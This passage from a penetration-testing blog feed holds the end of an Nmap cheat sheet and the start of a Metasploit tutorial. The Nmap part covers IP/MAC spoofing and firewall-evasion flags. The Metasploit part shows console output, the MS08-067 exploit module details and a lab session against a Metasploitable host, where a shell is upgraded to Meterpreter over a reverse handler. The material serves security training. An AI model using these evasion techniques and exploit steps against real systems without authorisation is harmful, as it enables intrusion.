<p><strong>&mdash;scanflags <flags></strong>: Customize TCP scan flags. You can couple it with specifying a TCP scan type to give Nmap a base of interpreting the results</p>

<p><strong>-S &lt;IP_Address></strong>: Spoof source address</p>

<p><strong>-sI <zombie host[:probeport]></strong>: Idle scan, a complex scan that is stealthy but slow. It uses zombies to perform the scan, without sending packets directly from your IP. Use in tandem with the -PN option to disable ping and not disclose your real address. Avoid -sV, as version detection would also make your IP visible to the target</p>

<p><strong>-f; &mdash;mtu <val></strong>: fragment packets (optionally w/given MTU), can aid in bypassing firewalls that don&rsquo;t handle fragmentation well</p>

<p><strong>-g/&mdash;source-port <portnum></strong>: Spoof source port, bypass security measures that rely only on checking the source port</p>

<p><strong>&mdash;spoof-mac <mac address/prefix/vendor name></strong>: Spoof your MAC address</p>

<p><strong>&mdash;badsum</strong>: Send packets with a bogus TCP/UDP/SCTP checksum. Normal hosts discard packets with bad checksums, but firewalls may omit these checks for performance reasons</p>

<p><strong>&mdash;dns-servers &lt;serv1[,serv2],&hellip;></strong>: Specify custom DNS servers when doing reverse DNS lookup to avoid your DNS server showing up in the target&rsquo;s logs</p>

<h3>Additional info</h3>

<p><strong>-v</strong>: increase verbosity level, you can use it 2 or 3 times to further increase verbosity</p>

<p><strong>-d</strong>: Increase debugging level (use -dd or more for greater effect), can increase to a max of 9</p>

<p><strong>&mdash;packet-trace</strong>: print summary of every packet sent and received</p>

<h3>Output</h3>

<p><strong>-oN/-oX/-oS/-oG <file></strong>: Output scan in normal, XML, sCrIpt kIddi3, and Grepable format, respectively, to the given filename</p>

<p><strong>-oA <basename></strong>: Output in the three major formats at once</p>

<p><strong>&mdash;resume <filename></strong>: Resume an aborted scan</p>

<p>If you don&rsquo;t want Nmap to display its interactive output, you can pass a <em>&ndash;</em> to the format type(s), like so: <code>-oS &ndash;</code></p>

<h2>Useful tips</h2>

<ul>
<li><p><code>nmap -sL -n target</code> &ndash; list IPs to be scanned before actually scanning them</p></li>
<li><p><code>-pT:22,80,U:53</code> &ndash; scan separate TCP and UDP ports (you have to specify a UDP scan in addition to a TCP scan)</p></li>
<li><p><code>&mdash;version-intensity <level></code>: Set from 0 (light) to 9 (try all probes), setting it to 0 will limit the version detection to the most likely to succeed probes, and improve the speed of the scan</p></li>
<li><p>you can scan a network range by adding the subnet mask after an IP like so: <em>ip/numbits</em>. An example would be: 192.168.80.0/24, where the hosts between 192.168.80.0 and 192.168.80.255 would be scanned</p></li>
<li><p>version detection is noisy</p></li>
<li><p>you can specify port 0 for a scan, to catch malicious software that might listen on it</p></li>
</ul>


<h2>Script scanning</h2>

<p><strong>-sC</strong>: enable some common scripts, may be intrusive to the target</p>

<p><strong>&mdash;script</strong>=<Lua scripts>: <Lua scripts> is a comma separated list of directories, script-files or script-categories</p>

<p><a href="https://nmap.org/book/nse-usage.html">Currently defined categories</a> are:</p>

<ul>
<li><p><em>auth</em> &ndash; operations requiring authentication credentials</p></li>
<li><p><em>broadcast</em> &ndash; local network broadcasts</p></li>
<li><p><em>brute</em> &ndash; brute force attacks</p></li>
<li><p><em>default</em> &ndash; scripts that are run by default with -sC or -A options</p></li>
<li><p><em>discovery</em> &ndash; additional network information and enumeration</p></li>
<li><p><em>dos</em> &ndash; denial of service scripts</p></li>
<li><p><em>exploit</em> &ndash; exploitation of some specific vulnerability</p></li>
<li><p><em>external</em> &ndash; information may be sent to a third-party database or service</p></li>
<li><p><em>fuzzer</em> &ndash; fuzzing scripts</p></li>
<li><p><em>intrusive</em> &ndash; may crash the target system, consume excessive resources, or be perceived as malicious</p></li>
<li><p><em>malware</em> &ndash; test if the target is infected by malware or backdoors</p></li>
<li><p><em>safe</em> &ndash; general network discovery scripts that re unlikely to be resource intensive, crash a system, or lit the target logs on fire</p></li>
<li><p><em>version</em> &ndash; scripts that run only with -sV enabled</p></li>
<li><p><em>vuln</em> &ndash; check for specific vulnerabilities</p></li>
</ul>


<p>A full list of scripts and their description and usage can be found at <a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a></p>

<p>Some notable scripts that you might use more often are listed below.</p>

<ul>
<li><p>dns-zone-transfer &ndash; requests a zone transfer from a DNS server</p></li>
<li><p>ftp-anon &ndash; checks if anonymous login is enabled on an FTP server and lists the root directory if yes</p></li>
<li><p>ftp-bounce &ndash; checks if FTP server allows port scanning via the bounce method</p></li>
<li><p>http-auth-finder &ndash; spiders a site to find pages containing form or HTTP authentication</p></li>
<li><p>http-backup-finder &ndash; spiders a site to find backups of discovered files</p></li>
<li><p>http-config-backup &ndash; searches for backups of web server and CMS configuration files</p></li>
<li><p>http-csrf &ndash; checks for forms vulnerable to CSRF</p></li>
<li><p>http-default-accounts &ndash; checks for default credentials in web applications, routers, and VOIP and security devices</p></li>
<li><p>http-devframework &ndash; checks for the underlying framework of a site</p></li>
<li><p>http-dlink-backdoor &ndash; checks for a firmware backdoor that is found in some D-Link routers</p></li>
<li><p>http-dombased-xss &ndash; searches for places susceptible to DOM-based XSS</p></li>
<li><p>http-drupal-enum-users &ndash; enumerates Drupal users</p></li>
<li><p>http-enum &ndash; enumerates common directories found in web apps</p></li>
<li><p>http-fileupload-exploiter &ndash; exploits file upload vulnerabilities</p></li>
<li><p>http-mobileversion-checker &ndash; checks if the site has a mobile version</p></li>
<li><p>http-open-redirect &ndash; checks for open redirects</p></li>
<li><p>http-passwd &ndash; checks for directory traversal</p></li>
<li><p>http-phpself-xss &ndash; finds PHP_SELF XSS vulnerabilities</p></li>
<li><p>http-rfi-spider &ndash; searches for RFI in forms and URL parameters</p></li>
<li><p>http-shellshock &ndash; checks if web app is vulnerable to shellshock</p></li>
<li><p>http-sitemap-generator &ndash; crawls a site and lists its directory structure and files</p></li>
<li><p>http-sql-injection &ndash; looks for SQLi in forms and URL parameters of HTTP servers</p></li>
<li><p>http-stored-xss &ndash; searches for unfiltered input that might lead to XSS</p></li>
<li><p>http-tplink-dir-traversal &ndash; on certain TPLINK routers that are vulnerable to directory traversal, it can read remote files with no authentication required</p></li>
<li><p>http-unsafe-output-escaping &ndash; crawls a site looking for where improperly escaped data is reflected back to the user</p></li>
<li><p>http-vuln-cve2012-1823 &ndash; attempts to exploit vulnerable PHP CGI apps that allow remote code execution</p></li>
<li><p>http-vuln-cve2015-1635 &ndash; checks for the MS15-034 RCE vulnerability in Windows machines</p></li>
<li><p>http-waf-detect &ndash; tries to detect IDS / IPS / WAF protection on the target</p></li>
<li><p>http-waf-fingerprint &ndash; attempts to fingerpring the WAF</p></li>
<li><p>http-webdav-scan &ndash; WebDAV detection</p></li>
<li><p>ipidseq &ndash; tests for suitable zombies to be used in idle scan</p></li>
<li><p>mongodb-databases &ndash; enumerates MongoDB tables</p></li>
<li><p>ms-sql-empty-password &ndash; tries to login as the sa account with no password on MS-SQL</p></li>
<li><p>mysql-empty-password &ndash; checks for MySQL servers with empty password for the root or anonymous account</p></li>
<li><p>samba-vuln-cve-2012-1182 &ndash; checks if Samba server is vulnerable to CVE-2012-1182 heap overflow</p></li>
<li><p>shodan-api &ndash; uses Shodan (API key needed) to scan targets in a way similar to the -sV scan</p></li>
<li><p>sniffer-detect &ndash; checks if a NIC on the local network is in promiscuous mode</p></li>
<li><p>ssl-heartbleed &ndash; checks for the Heartbleed vulnerability</p></li>
<li><p>ssl-poodle &ndash; checks for the Poodle vulnerability</p></li>
<li><p>tor-consensus-checker &ndash; checks if target host is a Tor node</p></li>
<li><p>traceroute-geolocation &ndash; performs geolocation on traceroute hops</p></li>
</ul>


<p>Many thanks to Fyodor for creating such an awesome tool and freely sharing with everyone! As you can see, Nmap is so much more than just a port scanner. You can easily perform some sort of vulnerability analysis and exploitation with it, and if there is no task that you would like Nmap to do and it can&rsquo;t, you can write the code yourself and contribute to this amazing project.</p>

<p>``` plain
/ You have the capacity to learn from \
\ mistakes. You&rsquo;ll learn a lot today. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Metasploit]]></title>
    <link href="http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit/"/>
    <updated>2016-06-11T13:57:36-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit</id>
    <content type="html"><![CDATA[<p>In this post I am going to focus on the use of Metasploit.</p>

<p>Before starting, I want to leave here some links to good resources for learning Metasploit:</p>

<p><a href="https://www.offensive-security.com/metasploit-unleashed/">Offensive Security Metasploit Unleashed free training course</a></p>

<p><a href="http://www.securitytube.net/groups?operation=view&amp;groupId=8">SecurityTube Metasploit Megaprimer</a></p>

<p><a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf">SANS Metasploit Cheatsheet</a></p>

<p><a href="http://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X?ie=UTF8&amp;*Version*=1&amp;*entries*=0">Metasploit: The Penetration Tester&rsquo;s Guide</a></p>

<!-- more -->


<h1>Msfconsole</h1>

<p>The <code>msfconsole</code> (Metasploit Framework Console) is where you will be spending most of your time when working with Metasploit. You can do almost everything from here, but the amount of commands might seem overwhelming at first.</p>

<p><img class="center" src="/images/tools/metasploit/msfbanner.png" title="&lsquo;msfconsole&rsquo; &lsquo;metasploit framework&rsquo;" ></p>

<p>Besides the Metasploit functionality, you <strong>can run external commands in the console</strong>, which is really helpful.</p>

<p>``` plain
msf > uname -a
[*] exec: uname -a</p>

<p>Linux pwnbox 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNU/Linux
```</p>

<p>The first thing you probably want to do is look at the help menu:</p>

<p>``` plain
msf > help</p>

<h1>Core Commands</h1>

<pre><code>Command       Description
-------       -----------
?             Help menu
advanced      Displays advanced options for one or more modules
back          Move back from the current context
banner        Display an awesome metasploit banner
cd            Change the current working directory
color         Toggle color
connect       Communicate with a host
edit          Edit the current module with $VISUAL or $EDITOR
exit          Exit the console
get           Gets the value of a context-specific variable
getg          Gets the value of a global variable
grep          Grep the output of another command
help          Help menu
info          Displays information about one or more modules
irb           Drop into irb scripting mode
jobs          Displays and manages jobs
kill          Kill a job
load          Load a framework plugin
loadpath      Searches for and loads modules from a path
makerc        Save commands entered since start to a file
options       Displays global options or for one or more modules
popm          Pops the latest module off the stack and makes it active
previous      Sets the previously loaded module as the current module
pushm         Pushes the active or list of modules onto the module stack
quit          Exit the console
reload_all    Reloads all modules from all defined module paths
rename_job    Rename a job
resource      Run the commands stored in a file
route         Route traffic through a session
save          Saves the active datastores
search        Searches module names and descriptions
sessions      Dump session listings and display information about sessions
set           Sets a context-specific variable to a value
setg          Sets a global variable to a value
show          Displays modules of a given type, or all modules
sleep         Do nothing for the specified number of seconds
spool         Write console output into a file as well the screen
threads       View and manipulate background threads
unload        Unload a framework plugin
unset         Unsets one or more context-specific variables
unsetg        Unsets one or more global variables
use           Selects a module by name
version       Show the framework and console library version numbers
</code></pre>

<p>&hellip;
```</p>

<p>Every time you enter a new context, you can use <strong>help</strong> to see the options available for that context. For instance, after selecting an exploit:</p>

<p>``` plain
msf > use exploit/linux/http/advantech_switch_bash_env_exec
msf exploit(advantech_switch_bash_env_exec) > help
&hellip;</p>

<h1>Exploit Commands</h1>

<pre><code>Command       Description
-------       -----------
check         Check to see if a target is vulnerable
exploit       Launch an exploit attempt
pry           Open a Pry session on the current module
rcheck        Reloads the module and checks if the target is vulnerable
reload        Just reloads the module
rerun         Alias for rexploit
rexploit      Reloads the module and launches an exploit attempt
run           Alias for exploit
</code></pre>

<p>```</p>

<p>Or after setting a payload:</p>

<p>``` plain</p>

<h1>Payload Commands</h1>

<pre><code>Command       Description
-------       -----------
check         Check to see if a target is vulnerable
generate      Generates a payload
pry           Open a Pry session on the current module
reload        Reload the current module from disk
</code></pre>

<p>```</p>

<p>Many commands also have their own help menu that you can access by typing <code>help cmd</code> or by passing the -h switch: <code>cmd -h</code>. Let&rsquo;s now glance over some core commands</p>

<h2>Core commands</h2>

<ul>
<li><strong>advanced</strong> &ndash; shows advanced options for a module</li>
</ul>


<p>``` plain
msf exploit(usermap_script) > advanced</p>

<p>Module advanced options (exploit/multi/samba/usermap_script):</p>

<p>   Name           : CHOST
   Current Setting:
   Description    : The local client address</p>

<p>   Name           : CPORT
   Current Setting:
   Description    : The local client port</p>

<p>   Name           : ConnectTimeout
   Current Setting: 10
   Description    : Maximum number of seconds to establish a TCP connection</p>

<p>   Name           : ContextInformationFile
   Current Setting:
   Description    : The information file that contains context information</p>

<p>   Name           : DisablePayloadHandler
   Current Setting: false
   Description    : Disable the handler code for the selected payload</p>

<p>   Name           : EnableContextEncoding
   Current Setting: false
   Description    : Use transient context when encoding payloads</p>

<p>   Name           : NTLM::SendLM
   Current Setting: true
   Description    : Always send the LANMAN response (except when NTLMv2_session is</p>

<pre><code>  specified)
</code></pre>

<p>   Name           : NTLM::SendNTLM
   Current Setting: true
   Description    : Activate the &lsquo;Negotiate NTLM key&rsquo; flag, indicating the use of</p>

<pre><code>  NTLM responses
</code></pre>

<p>   Name           : NTLM::SendSPN
   Current Setting: true
   Description    : Send an avp of type SPN in the ntlmv2 client blob, this allows</p>

<pre><code>  authentication on Windows 7+/Server 2008 R2+ when SPN is 
  required
</code></pre>

<p>   Name           : NTLM::UseLMKey
   Current Setting: false
   Description    : Activate the &lsquo;Negotiate Lan Manager Key&rsquo; flag, using the LM key</p>

<pre><code>  when the LM response is sent
</code></pre>

<p>   Name           : NTLM::UseNTLM2_session
   Current Setting: true
   Description    : Activate the &lsquo;Negotiate NTLM2 key&rsquo; flag, forcing the use of a</p>

<pre><code>  NTLMv2_session
</code></pre>

<p>   Name           : NTLM::UseNTLMv2
   Current Setting: true
   Description    : Use NTLMv2 instead of NTLM2_session when &lsquo;Negotiate NTLM2&rsquo; key</p>

<pre><code>  is true
</code></pre>

<p>   Name           : Proxies
   Current Setting:
   Description    : A proxy chain of format type:host:port[,type:host:port][&hellip;]</p>

<p>   Name           : SMB::ChunkSize
   Current Setting: 500
   Description    : The chunk size for SMB segments, bigger values will increase</p>

<pre><code>  speed but break NT 4.0 and SMB signing
</code></pre>

<p>   Name           : SMB::Native_LM
   Current Setting: Windows 2000 5.0
   Description    : The Native LM to send during authentication</p>

<p>   Name           : SMB::Native_OS
   Current Setting: Windows 2000 2195
   Description    : The Native OS to send during authentication</p>

<p>   Name           : SMB::VerifySignature
   Current Setting: false
   Description    : Enforces client-side verification of server response signatures</p>

<p>   Name           : SMBDirect
   Current Setting: true
   Description    : The target port is a raw SMB service (not NetBIOS)</p>

<p>   Name           : SMBDomain
   Current Setting: .
   Description    : The Windows domain to use for authentication</p>

<p>   Name           : SMBName
   Current Setting: *SMBSERVER
   Description    : The NetBIOS hostname (required for port 139 connections)</p>

<p>   Name           : SMBPass
   Current Setting:
   Description    : The password for the specified username</p>

<p>   Name           : SMBUser
   Current Setting:
   Description    : The username to authenticate as</p>

<p>   Name           : SSL
   Current Setting: false
   Description    : Negotiate SSL for outgoing connections</p>

<p>   Name           : SSLCipher
   Current Setting:
   Description    : String for SSL cipher &ndash; &ldquo;DHE-RSA-AES256-SHA&rdquo; or &ldquo;ADH&rdquo;</p>

<p>   Name           : SSLVerifyMode
   Current Setting: PEER
   Description    : SSL verification method (Accepted: CLIENT_ONCE,</p>

<pre><code>  FAIL_IF_NO_PEER_CERT, NONE, PEER)
</code></pre>

<p>   Name           : SSLVersion
   Current Setting: TLS1
   Description    : Specify the version of SSL/TLS to be used (TLS and SSL23 are</p>

<pre><code>  auto-negotiate) (Accepted: SSL2, SSL3, SSL23, TLS, TLS1, TLS1.1, 
  TLS1.2)
</code></pre>

<p>   Name           : VERBOSE
   Current Setting: false
   Description    : Enable detailed status messages</p>

<p>   Name           : WORKSPACE
   Current Setting:
   Description    : Specify the workspace for this module</p>

<p>   Name           : WfsDelay
   Current Setting: 0
   Description    : Additional delay when waiting for a session
```</p>

<ul>
<li><strong>back</strong> &ndash; allows you to go back from the current module</li>
</ul>


<p><code>plain
msf exploit(usermap_script) &gt; back
msf &gt;
</code></p>

<ul>
<li><strong>connect</strong> &ndash; connect to a host on the specified port, like you would do with netcat</li>
</ul>


<p>``` plain
msf > connect -h
Usage: connect [options] <host> <port></p>

<p>Communicate with a host, similar to interacting via netcat, taking advantage of
any configured session pivoting.</p>

<p>OPTIONS:</p>

<pre><code>-C        Try to use CRLF for EOL sequence.
-P &lt;opt&gt;  Specify source port.
-S &lt;opt&gt;  Specify source address.
-c &lt;opt&gt;  Specify which Comm to use.
-h        Help banner.
-i &lt;opt&gt;  Send the contents of a file.
-p &lt;opt&gt;  List of proxies to use.
-s        Connect with SSL.
-u        Switch to a UDP socket.
-w &lt;opt&gt;  Specify connect timeout.
-z        Just try to connect, then return.
</code></pre>

<p>msf > connect 192.168.80.156 25
[*] Connected to 192.168.80.156:25
220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
```</p>

<ul>
<li><strong>info</strong> &ndash; lists detailed information about a module, including description, vulnerable targets, payload information and more</li>
</ul>


<p>``` plain
msf > info exploit/windows/smb/ms08_067_netapi</p>

<pre><code>   Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
 Module: exploit/windows/smb/ms08_067_netapi
</code></pre>

<p>   Platform: Windows
 Privileged: Yes</p>

<pre><code>License: Metasploit Framework License (BSD)
   Rank: Great
</code></pre>

<p>  Disclosed: 2008-10-28</p>

<p>Provided by:
  hdm <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x78;&#x40;&#104;&#100;&#x6d;&#46;&#105;&#111;">&#120;&#x40;&#104;&#x64;&#109;&#x2e;&#105;&#111;</a>
  Brett Moore <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x62;&#114;&#x65;&#116;&#x74;&#46;&#x6d;&#x6f;&#x6f;&#x72;&#x65;&#x40;&#105;&#x6e;&#x73;&#111;&#109;&#x6e;&#x69;&#x61;&#x73;&#101;&#99;&#x2e;&#x63;&#111;&#x6d;">&#x62;&#114;&#x65;&#x74;&#x74;&#x2e;&#109;&#x6f;&#111;&#114;&#x65;&#64;&#105;&#110;&#x73;&#x6f;&#109;&#x6e;&#x69;&#x61;&#x73;&#101;&#99;&#46;&#x63;&#111;&#109;</a>
  frank2 <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x66;&#114;&#97;&#x6e;&#x6b;&#50;&#64;&#100;&#99;&#57;&#52;&#57;&#x2e;&#x6f;&#x72;&#103;">&#102;&#114;&#97;&#110;&#107;&#x32;&#64;&#x64;&#x63;&#x39;&#x34;&#57;&#46;&#111;&#x72;&#x67;</a>
  jduck <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#106;&#x64;&#117;&#99;&#107;&#x40;&#x6d;&#x65;&#x74;&#x61;&#x73;&#x70;&#x6c;&#x6f;&#x69;&#116;&#46;&#x63;&#111;&#x6d;">&#x6a;&#100;&#117;&#99;&#107;&#x40;&#x6d;&#x65;&#116;&#97;&#x73;&#112;&#x6c;&#111;&#105;&#116;&#x2e;&#x63;&#x6f;&#x6d;</a></p>

<p>Available targets:
  Id  Name</p>

<hr />

<p>  0   Automatic Targeting
  1   Windows 2000 Universal
  2   Windows XP SP0/SP1 Universal
  3   Windows 2003 SP0 Universal
  4   Windows XP SP2 English (AlwaysOn NX)
  5   Windows XP SP2 English (NX)
  6   Windows XP SP3 English (AlwaysOn NX)
  7   Windows XP SP3 English (NX)
  8   Windows XP SP2 Arabic (NX)
  9   Windows XP SP2 Chinese &ndash; Traditional / Taiwan (NX)
  10  Windows XP SP2 Chinese &ndash; Simplified (NX)
  11  Windows XP SP2 Chinese &ndash; Traditional (NX)
  12  Windows XP SP2 Czech (NX)
  13  Windows XP SP2 Danish (NX)
  14  Windows XP SP2 German (NX)
  15  Windows XP SP2 Greek (NX)
  16  Windows XP SP2 Spanish (NX)
  17  Windows XP SP2 Finnish (NX)
  18  Windows XP SP2 French (NX)
  19  Windows XP SP2 Hebrew (NX)
  20  Windows XP SP2 Hungarian (NX)
  21  Windows XP SP2 Italian (NX)
  22  Windows XP SP2 Japanese (NX)
  23  Windows XP SP2 Korean (NX)
  24  Windows XP SP2 Dutch (NX)
  25  Windows XP SP2 Norwegian (NX)
  26  Windows XP SP2 Polish (NX)
  27  Windows XP SP2 Portuguese &ndash; Brazilian (NX)
  28  Windows XP SP2 Portuguese (NX)
  29  Windows XP SP2 Russian (NX)
  30  Windows XP SP2 Swedish (NX)
  31  Windows XP SP2 Turkish (NX)
  32  Windows XP SP3 Arabic (NX)
  33  Windows XP SP3 Chinese &ndash; Traditional / Taiwan (NX)
  34  Windows XP SP3 Chinese &ndash; Simplified (NX)
  35  Windows XP SP3 Chinese &ndash; Traditional (NX)
  36  Windows XP SP3 Czech (NX)
  37  Windows XP SP3 Danish (NX)
  38  Windows XP SP3 German (NX)
  39  Windows XP SP3 Greek (NX)
  40  Windows XP SP3 Spanish (NX)
  41  Windows XP SP3 Finnish (NX)
  42  Windows XP SP3 French (NX)
  43  Windows XP SP3 Hebrew (NX)
  44  Windows XP SP3 Hungarian (NX)
  45  Windows XP SP3 Italian (NX)
  46  Windows XP SP3 Japanese (NX)
  47  Windows XP SP3 Korean (NX)
  48  Windows XP SP3 Dutch (NX)
  49  Windows XP SP3 Norwegian (NX)
  50  Windows XP SP3 Polish (NX)
  51  Windows XP SP3 Portuguese &ndash; Brazilian (NX)
  52  Windows XP SP3 Portuguese (NX)
  53  Windows XP SP3 Russian (NX)
  54  Windows XP SP3 Swedish (NX)
  55  Windows XP SP3 Turkish (NX)
  56  Windows 2003 SP1 English (NO NX)
  57  Windows 2003 SP1 English (NX)
  58  Windows 2003 SP1 Japanese (NO NX)
  59  Windows 2003 SP1 Spanish (NO NX)
  60  Windows 2003 SP1 Spanish (NX)
  61  Windows 2003 SP1 French (NO NX)
  62  Windows 2003 SP1 French (NX)
  63  Windows 2003 SP2 English (NO NX)
  64  Windows 2003 SP2 English (NX)
  65  Windows 2003 SP2 German (NO NX)
  66  Windows 2003 SP2 German (NX)
  67  Windows 2003 SP2 Portuguese &ndash; Brazilian (NX)
  68  Windows 2003 SP2 Spanish (NO NX)
  69  Windows 2003 SP2 Spanish (NX)
  70  Windows 2003 SP2 Japanese (NO NX)
  71  Windows 2003 SP2 French (NO NX)
  72  Windows 2003 SP2 French (NX)</p>

<p>Basic options:
  Name     Current Setting  Required  Description</p>

<hr />

<p>  RHOST                     yes       The target address
  RPORT    445              yes       Set the SMB service port
  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</p>

<p>Payload information:
  Space: 410
  Avoid: 8 characters</p>

<p>Description:
  This module exploits a parsing flaw in the path canonicalization
  code of NetAPI32.dll through the Server Service. This module is
  capable of bypassing NX on some operating systems and service packs.
  The correct target must be used to prevent the Server Service (along
  with a dozen others in the same process) from crashing. Windows XP
  targets seem to handle multiple successful exploitation events, but
  2003 targets will often crash or hang on subsequent attempts. This
  is just the first version of this module, full support for NX bypass
  on 2003, along with other platforms, is still in development.</p>

<p>References:
  <a href="http://cvedetails.com/cve/2008-4250/">http://cvedetails.com/cve/2008-4250/</a>
  <a href="http://www.osvdb.org/49243">http://www.osvdb.org/49243</a>
  <a href="http://technet.microsoft.com/en-us/security/bulletin/MS08-067">http://technet.microsoft.com/en-us/security/bulletin/MS08-067</a>
  <a href="http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos">http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos</a>
```</p>

<ul>
<li><strong>jobs</strong> &ndash; check and interact with backgrounds jobs</li>
</ul>


<p>``` plain
msf > jobs -h
Usage: jobs [options]</p>

<p>Active job manipulation and interaction.</p>

<p>OPTIONS:</p>

<pre><code>-K        Terminate all running jobs.
-h        Help banner.
-i &lt;opt&gt;  Lists detailed information about a running job.
-k &lt;opt&gt;  Terminate jobs by job ID and/or range.
-l        List all running jobs.
-v        Print more detailed info.  Use with -i and -l
</code></pre>

<p>```</p>

<ul>
<li><strong>makerc</strong> &ndash; save the commands executed since startup to the specified file.</li>
</ul>


<p>``` plain
msf exploit(usermap_script) > makerc demo.rc
[<em>] Saving last 3 commands to demo.rc &hellip;
msf exploit(usermap_script) > cat demo.rc
[</em>] exec: cat demo.rc</p>

<p>cat demo.rc
clear
sessions
```</p>

<ul>
<li><strong>options</strong> &ndash; displays the options of a module</li>
</ul>


<p>``` plain
msf > help options
Usage: options [mod1 mod2 &hellip;]</p>

<p>Queries the supplied module or modules for options. If no module is given,
show options for the currently active module.</p>

<p>msf > options</p>

<h1>Global Options:</h1>

<p>   Option            Current Setting    Description</p>

<hr />

<p>   ConsoleLogging    false              Log all console input and output
   LogLevel          0                  Verbosity of logs (default 0, max 3)
   MinimumRank       0                  The minimum rank of exploits that will run without explicit confirmation
   Prompt            msf                The prompt string
   PromptChar        >                  The prompt character
   PromptTimeFormat  %Y-%m-%d %H:%M:%S  Format for timestamp escapes in prompts
   SessionLogging    false              Log all input and output for sessions
   TimestampOutput   false              Prefix all console output with a timestamp
```</p>

<ul>
<li><strong>resource</strong> &ndash; runs the commands in a file</li>
</ul>


<p>``` plain
msf auxiliary(telnet_login) > help resource
Usage: resource path1 [path2 &hellip;]</p>

<p>Run the commands stored in the supplied files.  Resource files may also contain
ruby code between <ruby></ruby> tags.</p>

<p>See also: makerc
```</p>

<ul>
<li><strong>route</strong> &ndash; route traffic through a session</li>
</ul>


<p>``` plain
msf auxiliary(telnet_login) > route -h
Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]</p>

<p>Route traffic destined to a given subnet through a supplied session.
The default comm is Local.
```</p>

<ul>
<li><strong>save</strong> &ndash; saves the current configuration</li>
</ul>


<p>``` plain
msf > help save
Usage: save</p>

<p>Save the active datastore contents to disk for automatic use across restarts of the console</p>

<p>The configuration is stored in /root/.msf5/config
```</p>

<ul>
<li><strong>search</strong> &ndash; this is what you will use when searching for exploits</li>
</ul>


<p>``` plain
msf > help search
Usage: search [keywords]</p>

<p>Keywords:
  app       :  Modules that are client or server attacks
  author    :  Modules written by this author
  bid       :  Modules with a matching Bugtraq ID
  cve       :  Modules with a matching CVE ID
  edb       :  Modules with a matching Exploit-DB ID
  name      :  Modules with a matching descriptive name
  osvdb     :  Modules with a matching OSVDB ID
  platform  :  Modules affecting this platform
  ref       :  Modules with a matching ref
  type      :  Modules of a specific type (exploit, auxiliary, or post)</p>

<p>Examples:
  search cve:2009 type:exploit app:client</p>

<p>msf > search heartbleed</p>

<h1>Matching Modules</h1>

<p>   Name                                              Disclosure Date  Rank    Description</p>

<hr />

<p>   auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Information Leak
   auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
```</p>

<ul>
<li><strong>sessions</strong> &ndash; interact with sessions</li>
</ul>


<p>``` plain
msf > sessions -h
Usage: sessions [options]</p>

<p>Active session manipulation and interaction.</p>

<p>OPTIONS:</p>

<pre><code>-K        Terminate all sessions
-c &lt;opt&gt;  Run a command on the session given with -i, or all
-h        Help banner
-i &lt;opt&gt;  Interact with the supplied session ID
-k &lt;opt&gt;  Terminate sessions by session ID and/or range
-l        List all active sessions
-q        Quiet mode
-r        Reset the ring buffer for the session given with -i, or all
-s &lt;opt&gt;  Run a script on the session given with -i, or all
-t &lt;opt&gt;  Set a response timeout (default: 15)
-u &lt;opt&gt;  Upgrade a shell to a meterpreter session on many platforms
-v        List verbose fields
</code></pre>

<p>Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
```</p>

<p>In the following example I am upgrading the shell of a session to Meterpreter:</p>

<p>``` plain
msf exploit(usermap_script) > sessions</p>

<h1>Active sessions</h1>

<p>  Id  Type        Information  Connection</p>

<hr />

<p>  1   shell unix               192.168.80.155:34501 &ndash;> 192.168.80.156:4444 (192.168.80.156)</p>

<p>msf exploit(usermap_script) > sessions -u 1
[*] Executing &lsquo;post/multi/manage/shell_to_meterpreter&rsquo; on session(s): [1]</p>

<p>[<em>] Upgrading session ID: 1
[</em>] Starting exploit/multi/handler
[<em>] Started reverse TCP handler on 192.168.80.155:4433
[</em>] Starting the payload handler&hellip;
[<em>] Transmitting intermediate stager for over-sized stage&hellip;(105 bytes)
[</em>] Sending stage (1495599 bytes) to 192.168.80.156
[<em>] Command stager progress: 100.00% (668/668 bytes)
msf exploit(usermap_script) > [</em>] Meterpreter session 2 opened (192.168.80.155:4433 &ndash;> 192.168.80.156:58435) at 2016-06-02 13:53:36 -0400
```</p>

<ul>
<li><strong>set</strong>, <strong>setg</strong> &ndash; sets value to option (g for global variables). You will do lots of setting as you tweak your exploits :p</li>
</ul>


<p>``` plain
msf > help set
Usage: set [option] [value]</p>

<p>Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.</p>

<p>If run from a module context, this will set the value in the module&rsquo;s
datastore.  Use -g to operate on the global datastore</p>

<p>msf > setg</p>

<h1>Global</h1>

<p>  Name   Value</p>

<hr />

<p>  RHOST  192.168.80.156
```</p>

<ul>
<li><strong>show</strong> &ndash; displays various information as needed</li>
</ul>


<p><code>plain
msf &gt; help show
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
</code></p>

<p>The options that we need to edit when setting up exploits:</p>

<p>``` plain
msf exploit(ms08_067_netapi) > show options</p>
